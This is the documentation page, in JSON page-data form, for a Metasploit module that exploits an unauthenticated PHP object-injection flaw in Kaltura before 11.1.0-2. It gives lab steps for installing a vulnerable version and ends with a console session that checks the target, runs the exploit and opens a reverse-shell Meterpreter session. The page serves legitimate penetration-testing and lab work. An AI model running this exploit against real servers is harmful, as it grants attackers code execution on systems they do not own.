{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/kaltura_unserialize_rce","result":{"data":{"moduleMetadataJson":{"id":"9fc1514e-857b-544a-9e52-17709fb0e89c","name":"Kaltura Remote PHP Code Execution","fullname":"exploit/linux/http/kaltura_unserialize_rce","description":"This module exploits an Object Injection vulnerability in Kaltura.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the context of the web server user.\n\n        Kaltura has a module named keditorservices that takes user input\n        and then uses it as an unserialized function parameter. The constructed\n        object is based on the SektionEins Zend code execution POP chain PoC,\n        with a minor modification to ensure Kaltura processes it and the\n        Zend_Log function's __destruct() method is called. Kaltura versions\n        prior to 11.1.0-2 are affected by this issue.\n\n        This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/kaltura_unserialize_rce","documentationSlug":"/modules/documentation/exploit/linux/http/kaltura_unserialize_rce","referencesSlug":"/modules/references/exploit/linux/http/kaltura_unserialize_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user.</p>\n<p>Kaltura has a module named keditorservices that takes user input and then uses it as an unserialized function parameter. The constructed object is based on the SektionEins Zend code execution POP chain PoC, with a minor modification to ensure Kaltura processes it and the Zend_Log function's __destruct() method is called. Kaltura versions prior to 11.1.0-2 are affected by this issue.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>Kaltura has their own RPM and/or DEB packages to help us to install it without any issue. Following steps are slightly different than official wiki in order to install the vulnerable packages.</p>\n<p>Following steps are valid on the CentOS 6 x64 bit operating system.</p>\n<ol>\n<li>Install CentOS-6 x64 and run <code class=\"language-text\">yum update -y</code> in order to fetch and install the latest packages. Also setting the hostname to something like <em>kalturahack.dev</em> would be wise, because it will be used during Kaltura installation.</li>\n<li>\n<p>Disable iptables and selinux. </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">iptables -F\nservice iptables stop\nchkconfig iptables off\nsetenforce permissive\n(selinux will be enabled on reboot unless editing /etc/selinux/config file.)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Install following pre-requisites.</li>\n<li>PHP 5.3.n, 5.4.n, 5.5.n, 5.6.n [the official distro repo version]</li>\n<li>MySQL/MariaDB [the official distro repo version]. Please make sure your MySQL is configured not to enforce strict mode.</li>\n<li>JRE 1.7.n (openjdk can be used)</li>\n<li>\n<p>Install Kaltura yum repo.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">rpm -ihv http://installrepo.kaltura.org/releases/kaltura-release.noarch.rpm</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>Kaltura repo is configured for the latest version by default. We need to change it to one of the vulnerable releases. Thus, open <code class=\"language-text\">/etc/yum.repos.d/kaltura.repo</code> file with your favorite text editor and perform following replacement.</li>\n</ol>\n<p>Original file. (# lines just ignored)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[Kaltura]\nname = Kaltura Server\nbaseurl = http://installrepo.kaltura.org/releases/latest/RPMS/$basearch/\ngpgkey = http://installrepo.kaltura.org/releases/RPM-GPG-KEY-kaltura\ngpgcheck = 1 \nenabled = 1\n\n[Kaltura-noarch]\nname = Kaltura Server arch independent\nbaseurl = http://installrepo.kaltura.org/releases/latest/RPMS/noarch\ngpgkey = http://installrepo.kaltura.org/releases/RPM-GPG-KEY-kaltura\ngpgcheck = 1\nenabled = 1\nbaseurl = http://installrepo.kaltura.org/releases/latest/RPMS/$basearch/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>After changes.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[Kaltura]\nname = Kaltura Server\nbaseurl = http://installrepo.kaltura.org/releases/10.10.0/RPMS/$basearch/\ngpgkey = http://installrepo.kaltura.org/releases/RPM-GPG-KEY-kaltura\ngpgcheck = 1 \nenabled = 1\n\n[Kaltura-noarch]\nname = Kaltura Server arch independent\nbaseurl = http://installrepo.kaltura.org/releases/10.10.0/RPMS/noarch\ngpgkey = http://installrepo.kaltura.org/releases/RPM-GPG-KEY-kaltura\ngpgcheck = 1\nenabled = 1\nbaseurl = http://installrepo.kaltura.org/releases/latest/RPMS/$basearch/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"6\">\n<li>\n<p>Install kaltura-server. This will take a while. </p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">yum clean all\nyum install kaltura-server</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Run the following commands in order to initiate the database and start necessary services.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">/opt/kaltura/bin/kaltura-mysql-settings.sh\nservice memcached restart\nservice ntpd restart\nchkconfig memcached on\nchkconfig ntpd on</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>Start the kaltura configuration script <code class=\"language-text\">/opt/kaltura/bin/kaltura-config-all.sh</code> .</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[Email\\NO]: &quot;&lt;your email address&gt;&quot;\nCDN hostname [kalrpm.lcl]: &quot;&lt;your hostname&gt;&quot;\nApache virtual hostname [kalrpm.lcl]: &quot;&lt;your hostname&gt;&quot;\nWhich port will this Vhost listen on [80]?:\n\nDB hostname [127.0.0.1]: &quot;&lt;127.0.0.1&gt;&quot;\nDB port [3306]: &quot;&lt;3306&gt;&quot;\nMySQL super user [this is only for setting the kaltura user passwd and WILL NOT be used with the application]: &quot;&lt;root&gt;&quot;\nMySQL super user passwd [this is only for setting the kaltura user passwd and WILL NOT be used with the application]: &quot;&lt;your root password&gt;&quot;\nAnalytics DB hostname [127.0.0.1]: &quot;&lt;127.0.0.1&gt;&quot;\nAnalytics DB port [3306]: &quot;&lt;3306&gt;&quot;\nSphinx hostname [127.0.0.1]: &quot;&lt;127.0.0.1&gt;&quot;\n\nSecondary Sphinx hostname: [leave empty if none] &quot;&lt;empty&gt;&quot;\n\nVOD packager hostname [kalrpm.lcl]: &quot;&lt;http://kaltura-nginx-hostname&gt;&quot;\n\nVOD packager port to listen on [88]: \n\nService URL [http://kalrpm.lcl:80]: &quot;&lt;http://apache-hostname:80&gt;&quot;\n\nKaltura Admin user (email address): &quot;&lt;your email address&gt;&quot;\nAdmin user login password (must be minimum 8 chars and include at least one of each: upper-case, lower-case, number and a special character): &quot;&lt;your kaltura admin password&gt;&quot;\nConfirm passwd: &quot;&lt;your kaltura admin password&gt;&quot;\n\nYour time zone [see http://php.net/date.timezone], or press enter for [Europe/Amsterdam]: &quot;&lt;your timezone&gt;&quot;\nHow would you like to name your system (this name will show as the From field in emails sent by the system) [Kaltura Video Platform]? &quot;&lt;your preferred system name&gt;&quot;\nYour website Contact Us URL [http://corp.kaltura.com/company/contact-us]: &quot;&lt;your contact URL&gt;&quot;\n&#39;Contact us&#39; phone number [+1 800 871 5224]? &quot;&lt;your phone numer&gt;&quot;\n\nIs your Apache working with SSL?[Y/n] &quot;&lt;n&gt;&quot;\nIt is recommended that you do work using HTTPs. Would you like to continue anyway?[N/y] &quot;&lt;y&gt;&quot;\nWhich port will this Vhost listen on? [80] &quot;&lt;80&gt;&quot;\nPlease select one of the following options [0]: &quot;&lt;0&gt;&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>I do recommend that leaving all default values as is except SSL. You may want to install Kaltura without SSL support.</p>\n<p>These steps are slightly different than following instruction.\n<a href=\"http://kaltura-install-packages.readthedocs.io/en/latest/install-kaltura-redhat-based/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://kaltura-install-packages.readthedocs.io/en/latest/install-kaltura-redhat-based/</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/webapp/kaltura_unserialize_rce \nmsf exploit(kaltura_unserialize_rce) &gt; set RHOST centoshacker.dev\nRHOST =&gt; centoshacker.dev\nmsf exploit(kaltura_unserialize_rce) &gt; check\n[+] centoshacker.dev:80 The target is vulnerable.\nmsf exploit(kaltura_unserialize_rce) &gt; exploit \n\n[*] Started reverse TCP handler on 10.0.0.1:4444 \n[*] Sending stage (33721 bytes) to 10.0.0.134\n[*] Meterpreter session 1 opened (10.0.0.1:4444 -&gt; 10.0.0.134:50312) at 2016-09-17 22:56:44 +0300\n\nmeterpreter &gt; pwd\n/opt/kaltura/app/alpha/web\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9fc1514e-857b-544a-9e52-17709fb0e89c"}}}